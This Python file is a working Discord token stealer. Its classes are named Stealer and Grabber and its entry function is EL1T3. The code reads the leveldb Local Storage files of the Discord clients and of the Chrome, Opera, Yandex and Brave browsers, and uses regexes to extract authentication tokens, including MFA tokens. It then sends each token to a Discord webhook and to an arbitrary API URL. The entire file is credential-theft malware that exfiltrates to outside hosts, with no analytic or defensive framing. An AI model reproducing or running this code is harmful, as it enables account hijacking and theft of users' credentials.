from discord_webhook import DiscordWebhook, DiscordEmbed
import requests, os, re, json

class Stealer():
    def __init__(self):
        self.Roaming    = os.getenv('APPDATA')
        self.Local      = os.getenv('LOCALAPPDATA')
        self.Discord_Path = [
                                'ROAMING\\Discord',
                                'ROAMING\\discordptb',
                                'ROAMING\\discordcanary',
                                'ROAMING\\Opera Software\\Opera Stable',
                                'LOCAL\\Google\\Chrome\\User Data\\Default',
                                'LOCAL\\Yandex\\YandexBrowser\\User Data\\Default',
                                'LOCAL\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                            ]

    def GetTokens(self):
        TokenList  = []
        TokenFirst = []
        for Path in self.Discord_Path:
            Path = Path.replace('ROAMING', self.Roaming).replace('LOCAL', self.Local)
            if os.path.exists(Path) == True:
                Path += '\\Local Storage\\leveldb'
                for file_name in os.listdir(Path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{Path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in re.findall(regex, line):
                                if token[:20] not in TokenFirst:
                                    TokenFirst.append(token[:20])
                                    TokenList.append(token)
        return TokenList

class Grabber():
    def __init__(self, Hook, Api):
        self.Embeds = [  ]
        self.Hook   = Hook
        self.Tokn   = [ ]
        self.Api    = Api
    
    def get_tokens(self):
        TokenStealer = Stealer()
        self.Tokn = TokenStealer.GetTokens()
    
    def create_embed(self):
        for Token in self.Tokn:
            self.Embeds.append(DiscordEmbed(description= f'> **Token:** `{Token}`', color='000001'))

    def send_to_api(self):
        if self.Api == None:
            return
            
        for Token in self.Tokn:
            try:
                requests.post(f'{self.Api}{Token}')
            except:
                pass

    def send(self):
        if self.Hook == None:
            return

        webhook = DiscordWebhook(url= self.Hook)

        for Embed in self.Embeds:
            webhook.add_embed(Embed)
        
        webhook.execute()

def EL1T3(webhook_url = None, api_url = None):
    EL1T3_Client = Grabber(webhook_url, api_url)
    EL1T3_Client.get_tokens()
    EL1T3_Client.create_embed()
    EL1T3_Client.send_to_api()
    EL1T3_Client.send()